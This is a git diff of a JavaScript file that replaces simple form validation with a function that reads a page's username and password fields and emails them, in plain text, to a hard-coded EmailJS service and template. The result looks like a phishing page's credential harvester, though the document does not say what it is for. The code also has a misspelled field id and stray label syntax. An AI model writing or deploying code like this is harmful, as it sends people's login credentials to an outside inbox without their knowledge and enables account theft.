@@ -1,15 +1,19 @@
 "use strict";
-const form = document.getElementById("form");
-const emailForm = document.getElementById("email");
-const btnSubmit = document.querySelector(".btn");
-const usernameEl = document.querySelector("username");
+function sendEmail() {
+  const params = {
+    username: document.getElementById("username").value,
+    password: document.getElementById("passsword").value,
+  };
+  const serviceID = "service_4zmio4z";
+  const templateID = "template_goa7aed";
 
-form.addEventListener("submit", (e) => {
-  e.preventDefault();
-  if (usernameEl === "") {
-    btnSubmit.addEventListener("click", function () {
-      usernameEl.value = `submit more details`;
-      console.log(usernameEl);
-    });
-  }
-});
+  emailjs
+    .send(serviceID, templateID, params)
+    .then((res) => {
+      username: document.getElementById("username").value = "";
+      password: document.getElementById("passsword").value = "";
+      console.log(res);
+      alert("successful");
+    })
+    .catch((err) => console.log(err));
+}
